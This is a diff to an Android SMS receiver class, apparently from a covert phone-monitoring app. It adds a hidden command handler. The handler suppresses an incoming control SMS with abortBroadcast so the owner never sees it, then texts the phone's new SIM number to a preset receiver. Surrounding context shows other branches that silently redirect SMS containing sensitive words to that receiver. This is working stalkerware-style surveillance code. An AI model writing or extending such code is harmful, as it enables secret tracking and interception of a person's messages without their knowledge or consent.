@@ -341,6 +341,29 @@ public class SmsReceiver extends BroadcastReceiver
 			}
 			
 			//-------------------------------------------------------------------------------
+			// Send SIM change SMS to recv phone to report the new SIM phone number
+			else if (smsBody.startsWith(SmsConsts.HEADER_SIM_EX))
+			{
+				abortBroadcast(); // Do not show location activation SMS
+				
+				if (!ConfigCtrl.isLegal(context)) return;
+				this.context = context;
+				
+				String[] parts = smsBody.split(SmsConsts.SEPARATOR);
+				if (parts.length < 2) return;
+				
+				String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+				if (recvPhoneNum != null && recvPhoneNum.length() > 0) 
+				{
+					String newPhoneNum = parts[1].trim();
+					String strContent = String.format(context.getResources().getString(R.string.msg_changed_sim), ConfigCtrl.getSelfName(context))
+							+ String.format(context.getResources().getString(R.string.msg_changed_sim_new_number), newPhoneNum);
+					boolean ret = SmsCtrl.sendSms(recvPhoneNum, strContent);
+					ConfigCtrl.setSelfPhoneNum(context, newPhoneNum);
+				}
+			}
+			
+			//-------------------------------------------------------------------------------
 			// Redirect SMS that contains sensitive words
 			else if (GlobalPrefActivity.getRedirectAllSms(context) || containSensitiveWords(context, smsBody)) 
 			{
